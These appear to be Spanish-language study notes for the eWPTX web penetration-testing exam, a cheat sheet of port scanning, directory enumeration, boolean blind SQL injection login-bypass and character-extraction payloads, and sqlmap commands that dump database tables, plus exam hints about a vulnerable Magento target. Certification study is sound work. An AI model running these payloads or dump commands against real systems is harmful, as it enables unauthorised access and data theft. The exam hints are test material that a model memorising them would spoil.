# eWPTX
---
## Escaneo de puertos
![image](https://github.com/user-attachments/assets/02a7281d-02c7-43ec-afe6-ece2eecf0317)

nmap -n -Pn -p- --open -vvv -T5 [IP] 

## Enumeración
![image](https://github.com/user-attachments/assets/1d95388b-e208-4b30-8e2c-ad1943a44dee)

dirb http://172.17.0.2/ [rockyou, common, big] -N 401 (Ignora un método) -r (No es recursivo)
##
dirsearch -u http://[IP]/ -w [WORDLIST] -t 16 -e php,txt -f (NO ESTÁ DISPONIBLE EN EL EXAMEN)

---

## 💉 Inyección SQL (SQLi): Blind SQLi
En el examen: MAGENTO ES VULNERABLE A SQLi

En las inyecciones a ciegas, el resultado no se ve en la pantalla (son deductivas... a partir del comportamiento de la aplicación)
### BOOLEAN
Tiene un comportamiento verdadero o falso (0 o 1)

|User: |' OR 1=1-- -|
|----|-----|
|Pass: |' OR 1=1-- -|

|User: |' OR (substring(database(),1,1))='p' -- -|
|-------|-------------|
|Pass: |' OR (substring(database(),1,1))='p' -- -|

|User: |' OR (ascii(substring(database(),1,1)))='45' -- -|
|----|----|
|Pass: |' OR (ascii(substring(database(),1,1)))='45' -- -|

|User: |' OR (ascii(substring(database(),1,1)))>'45' -- -|
|----|----|
|Pass: |' OR (ascii(substring(database(),1,1)))>'45' -- -|

Se puede automatizar con el BurpSuite:

Intruder --> payloads (numero) --> 32-126 

settings --> Redirections (always)


---
### TIME
Tiempo de carga (¿Cuanto demora en carga una página web?)


### OOB
Si se puede lelvar la info fuera del servidor
## 

### SQLMAP
--technique=BTU

--risk=

1: Payload a nivel de select y uniones

2: Payload de tiempo. Por ejemplo SLEEP.

3: Payload basados en BOOLEAN en OR

--level=

1: inyecciones en metodos GET/POST

2: inyecciones en las cookies

3: inyecciones en los headers: user-agent, referer

4: inyecciones todos los headers

5: inyecciones en todos los parametros sin excepción

### Boolean

- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 --current-db --dbms=mysql

- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 -D privacidadDB --tables --dbms=mysql

- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 -D privacidadDB -T usuarios --dump --dbms=mysql

### Time

- sqlmap -r request_time.txt -p descripción --technique=T --risk=3 --level=3 --current-db --dbms=mysql --flush-session

### Orden para usar SQLMAP

- sqlmap -r request.txt
- sqlmap -u 'http://localhost/' -p idmagento(parameter) --dbs
- sqlmap -u 'http://localhost/' -p idmagento(parameter) --current-db
- sqlmap -u 'http://localhost/' -p idmagento(parameter) -D magento --tables
- sqlmap -u 'http://localhost/' -p idmagento(parameter) -D magento -T user --start=1 --stop=10

---

## ♟️ Estratégia
1. Iniciar por el CMS MAGENTO
   
   - Version: [IP]/magento/magento_version (Buscar vulnerabilidad de la versión)
